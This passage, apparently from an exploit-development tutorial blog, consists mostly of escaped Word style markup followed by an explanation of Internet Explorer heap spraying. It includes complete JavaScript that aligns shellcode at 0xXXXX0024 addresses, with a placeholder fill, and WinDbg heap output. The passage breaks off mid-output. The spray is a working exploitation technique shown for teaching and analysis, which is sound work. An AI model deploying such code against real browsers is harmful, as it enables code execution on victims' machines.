   UnhideWhenUsed="false" Name="Medium Shading 2"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" UnhideWhenUsed="false" Name="Revision"/&gt;   &lt;w:LsdException Locked="false" Priority="34" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="List Paragraph"/&gt;   &lt;w:LsdException Locked="false" Priority="29" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Quote"/&gt;   &lt;w:LsdException Locked="false" Priority="30" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Quote"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="19" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtle Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="21" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="31" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtle Reference"/&gt;   &lt;w:LsdException Locked="false" Priority="32" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Reference"/&gt;   &lt;w:LsdException Locked="false" Priority="33" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Book Title"/&gt;   &lt;w:LsdException Locked="false" Priority="37" Name="Bibliography"/&gt;   &lt;w:LsdException Locked="false" Priority="39" QFormat="true" Name="TOC Heading"/&gt;  &lt;/w:LatentStyles&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 10]&gt; &lt;style&gt;
 /* Style Definitions */
 table.MsoNormalTable
	{mso-style-name:"Table Normal";
	mso-tstyle-rowband-size:0;
	mso-tstyle-colband-size:0;
	mso-style-noshow:yes;
	mso-style-priority:99;
	mso-style-parent:"";
	mso-padding-alt:0in 5.4pt 0in 5.4pt;
	mso-para-margin-top:0in;
	mso-para-margin-right:0in;
	mso-para-margin-bottom:10.0pt;
	mso-para-margin-left:0in;
	line-height:115%;
	mso-pagination:widow-orphan;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	mso-ascii-font-family:Calibri;
	mso-ascii-theme-font:minor-latin;
	mso-hansi-font-family:Calibri;
	mso-hansi-theme-font:minor-latin;
	mso-bidi-font-family:"Times New Roman";
	mso-bidi-theme-font:minor-bidi;}
&lt;/style&gt; &lt;![endif]--&gt;  &lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;Therefore, any javascript string will be 6 bytes long plus the length of the Unicode encoded string. Also, heap chunks allocated with VirtualAlloc are 0x20 bytes in length. As a result, shellcode allocated through VirtualAlloc will always reside at offset 0x24. Also, because each allocation results in a 64K-aligned address, we can make a series of string allocations that equal exactly 64K. That way, the start of our shellcode will always be located at an address of the form (0xXXXX0024).&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;The following javascript code takes advantage of these concepts by allocating an array of sixteen 64K strings (i.e. 1 megabyte).&lt;span&gt;&amp;nbsp; &lt;/span&gt;Note the sixteenth allocation accounts for the size of the heap header and string length so that exactly one megabyte gets allocated. The resultant array is then allocated one hundred times resulting in an allocation of exactly 100MB.&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;function heapspray() {&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;var shellcode = "\u4141";&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;while (shellcode.length &amp;lt; 100000)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;shellcode = shellcode + shellcode;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;var onemeg = shellcode.substr(0, 64*1024/2);&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;for (i=0; i&amp;lt;14; i++) {&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;onemeg += shellcode.substr(0, 64*1024/2);&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;onemeg += shellcode.substr(0, (64*1024/2)-(38/2));&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;var spray = new Array();&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;for (i=0; i&amp;lt;100; i++) {&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;spray[i] = onemeg.substr(0, onemeg.length);&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;input type="button" value="Spray the heap" onclick="heapspray()"&amp;gt;&amp;lt;/input&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;span&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNormal" style="line-height: normal; margin-bottom: 0in;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;Run the javascript code above and follow along with the following analysis in WinDbg. Start by viewing the addresses of the heaps in Internet Explorer:&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;!heap -stat&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;_HEAP 00360000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Segments&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Reserved&lt;span&gt;&amp;nbsp; &lt;/span&gt;bytes 00100000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Committed bytes 000f1000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAllocBlocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAlloc bytes 035f0000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;_HEAP 035b0000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Segments&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Reserved&lt;span&gt;&amp;nbsp; &lt;/span&gt;bytes 00040000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Committed bytes 00019000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAllocBlocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAlloc bytes 00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;_HEAP 00750000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Segments&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Reserved&lt;span&gt;&amp;nbsp; &lt;/span&gt;bytes 00040000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Committed bytes 00012000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAllocBlocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAlloc bytes 00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;_HEAP 00270000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Segments&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Reserved&lt;span&gt;&amp;nbsp; &lt;/span&gt;bytes 00010000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Committed bytes 00010000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: 